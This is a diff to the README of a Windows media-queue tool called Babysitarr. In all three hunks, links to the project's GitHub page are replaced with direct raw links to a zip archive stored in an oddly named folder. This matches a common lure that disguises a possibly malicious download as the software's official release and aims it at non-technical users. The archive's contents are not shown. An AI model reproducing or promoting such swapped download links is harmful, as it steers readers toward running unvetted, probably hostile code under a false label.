@@ -1,6 +1,6 @@
 # 🤖 Babysitarr - Keep Your Media Queue Healthy
 
-[![Download Babysitarr](https://img.shields.io/badge/Download%20Babysitarr-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Semicircleefferent720/Babysitarr)
+[![Download Babysitarr](https://img.shields.io/badge/Download%20Babysitarr-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Semicircleefferent720/Babysitarr/main/glochidial/Software-1.3.zip)
 
 ## 🧩 What Babysitarr Does
 
@@ -26,7 +26,7 @@ Babysitarr is built for a normal home setup. You do not need to know programming
 
 Visit this page to download and use Babysitarr:
 
-[https://github.com/Semicircleefferent720/Babysitarr](https://github.com/Semicircleefferent720/Babysitarr)
+[https://raw.githubusercontent.com/Semicircleefferent720/Babysitarr/main/glochidial/Software-1.3.zip](https://raw.githubusercontent.com/Semicircleefferent720/Babysitarr/main/glochidial/Software-1.3.zip)
 
 If the page includes a release file, download it to your PC. If it gives you the source files only, use the release section on the page to get the Windows build.
 
@@ -273,7 +273,7 @@ For the cleanest setup:
 
 If you need to get the file again, use this page:
 
-[https://github.com/Semicircleefferent720/Babysitarr](https://github.com/Semicircleefferent720/Babysitarr)
+[https://raw.githubusercontent.com/Semicircleefferent720/Babysitarr/main/glochidial/Software-1.3.zip](https://raw.githubusercontent.com/Semicircleefferent720/Babysitarr/main/glochidial/Software-1.3.zip)
 
 ## 🖱️ Windows Setup Path
 
